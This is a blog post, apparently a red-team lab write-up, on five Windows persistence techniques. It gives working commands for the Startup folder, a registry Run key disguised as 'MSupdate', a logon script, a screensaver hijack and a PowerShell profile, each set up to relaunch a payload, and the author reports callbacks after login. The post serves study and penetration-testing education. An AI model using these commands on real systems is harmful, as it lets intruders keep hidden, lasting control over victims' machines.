# https://medium.com/@devraval2603/windows-persistence-techniques-0e5735740c9c

[Sitemap](https://medium.com/sitemap/sitemap.xml)

[Open in app](https://play.google.com/store/apps/details?id=com.medium.reader&referrer=utm_source%3DmobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40devraval2603%2Fwindows-persistence-techniques-0e5735740c9c&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

Get app

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40devraval2603%2Fwindows-persistence-techniques-0e5735740c9c&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png)

# Windows Persistence Techniques

[![wremad](https://miro.medium.com/v2/da:true/resize:fill:32:32/0*JhpsD_qLhghaa7VX)](https://medium.com/@devraval2603?source=post_page---byline--0e5735740c9c---------------------------------------)

[wremad](https://medium.com/@devraval2603?source=post_page---byline--0e5735740c9c---------------------------------------)

Follow

3 min read

·

Apr 1, 2026

35

1

[Listen](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2Fplans%3Fdimension%3Dpost_audio_button%26postId%3D0e5735740c9c&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40devraval2603%2Fwindows-persistence-techniques-0e5735740c9c&source=---header_actions--0e5735740c9c---------------------post_audio_button------------------)

Share

## Introduction

After getting initial access, the next obvious step is persistence. If your access dies after a reboot or logout, the whole effort is wasted.

In this write-up, I’ve documented a few **Windows persistence techniques** that I tested in my lab. These are simple but effective methods that can help maintain access depending on the situation. Everything here was tested on my own machine in a controlled environment.

1. **Startup Folder**

This is probably the most straightforward way to get persistence.

> **Command**

```
copy wre.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
```

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*efNmnrJ4VbCG930C4JXYnQ.png)

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*MW6r6jVEMY0qmsUFjrX8XA.png)

2\. **Registry Run Key**

Another reliable method is abusing the Run key in the registry.

> **Command**

```
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v MSupdate /t REG_SZ /d C:\Users\wremad\Downloads\wre.exe /f
```

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*g6KV_dhkmspA1-dzqskhZQ.png)

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*_hz34B6fajk4Ng4IwrkAdg.png)

3\. **Logon Script**

> **Command**

```
reg add "HKEY_CURRENT_USER\Environment" /v UserInitMprLogonScript /d "c:\logon.bat" /t REG_SZ /f
```

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*VbrtIhQsv-2Y_43lYaATdw.png)

![](https://miro.medium.com/v2/resize:fit:553/1*khG9nQ5Ila5q4Cgwn80IpA.png)

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*Li83R2QaNvhfkPL4C5Q9GQ.png)

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*3zjdoh2lql_bJUKSCm-8cg.png)

**Testing Multiple Techniques** At this point, I had persistence via:

- Startup folder
- Registry Run key
- Logon script

When I tested them together, I was able to get multiple callbacks after login.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*AcD-sTNoleYBmH4LNdRc2Q.png)

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*5TKwndnCWizuf2CdSVGXYA.png)

**4\. Screensaver Trick**

## Get wremad’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Subscribe

Remember me for faster sign in

This method leverages Windows screensaver behavior. Once the system becomes idle, the configured screensaver executable is triggered. By modifying this value, a payload can be executed when the user is inactive.

> **Command**

```
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "SCRNSAVE.EXE" /t REG_SZ /d "C:\Users\wremad\Downloads\wre1.exe" /f

reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "ScreenSaveTimeOut" /t REG_SZ /d "60" /f
```

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*CxZPR0pBzkcx0OTKjehInA.png)

5\. **Powershell Profile**

In this method whenever PowerShell starts, it loads the profile script which now executes your payload. In my test, once PowerShell was executed with higher privileges, I got a higher-privileged callback.

> **Command**

```
cd C:\Users\wremad\Documents\WindowsPowerShell

echo C:\Users\wremad\Downloads\wre1.exe > profile.ps1
```

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*-ACNjF_UYObOnzNXGH0hrg.png)

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*OzFpkAOhoZBvZMaOzxOveA.png)

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*Fdz5Sh6SaYM-d48IghVEYA.png)

## Final Thoughts

There’s no single “best” persistence technique — it really depends on the environment.

- Some are noisy but reliable
- Some are quieter but depend on user behavior
- Combining multiple techniques increases your chances of staying in

In my testing, running multiple persistence methods together resulted in consistent callbacks after login and user activity.

## Disclaimer

All techniques were tested in a personal lab for educational purposes only. Do not use these methods on systems without proper authorization.

[Windows Persistence](https://medium.com/tag/windows-persistence?source=post_page-----0e5735740c9c---------------------------------------)

[Cyber Security](https://medium.com/tag/cyber-security?source=post_page-----0e5735740c9c---------------------------------------)

[Red Team](https://medium.com/tag/red-team?source=post_page-----0e5735740c9c---------------------------------------)

[Apt Group](https://medium.com/tag/apt-group?source=post_page-----0e5735740c9c---------------------------------------)

[Pentesting](https://medium.com/tag/pentesting?source=post_page-----0e5735740c9c---------------------------------------)

[![wremad](https://miro.medium.com/v2/resize:fill:48:48/0*JhpsD_qLhghaa7VX)](https://medium.com/@devraval2603?source=post_page---post_author_info--0e5735740c9c---------------------------------------)

[![wremad](https://miro.medium.com/v2/resize:fill:64:64/0*JhpsD_qLhghaa7VX)](https://medium.com/@devraval2603?source=post_page---post_author_info--0e5735740c9c---------------------------------------)

Follow

[**Written by wremad**](https://medium.com/@devraval2603?source=post_page---post_author_info--0e5735740c9c---------------------------------------)

[1 follower](https://medium.com/@devraval2603/followers?source=post_page---post_author_info--0e5735740c9c---------------------------------------)

· [46 following](https://medium.com/@devraval2603/following?source=post_page---post_author_info--0e5735740c9c---------------------------------------)

Follow

## Responses (1)

![](https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png)

Write a response

[What are your thoughts?](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40devraval2603%2Fwindows-persistence-techniques-0e5735740c9c&source=---post_responses--0e5735740c9c---------------------respond_sidebar------------------)

Cancel

Respond

See all responses

[Help](https://help.medium.com/hc/en-us?source=post_page-----0e5735740c9c---------------------------------------)

[Status](https://status.medium.com/?source=post_page-----0e5735740c9c---------------------------------------)

[About](https://medium.com/about?autoplay=1&source=post_page-----0e5735740c9c---------------------------------------)

[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----0e5735740c9c---------------------------------------)

[Press](mailto:pressinquiries@medium.com)

[Blog](https://blog.medium.com/?source=post_page-----0e5735740c9c---------------------------------------)

[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----0e5735740c9c---------------------------------------)

[Rules](https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page-----0e5735740c9c---------------------------------------)

[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----0e5735740c9c---------------------------------------)

[Text to speech](https://speechify.com/medium?source=post_page-----0e5735740c9c---------------------------------------)

reCAPTCHA

Recaptcha requires verification.

protected by **reCAPTCHA**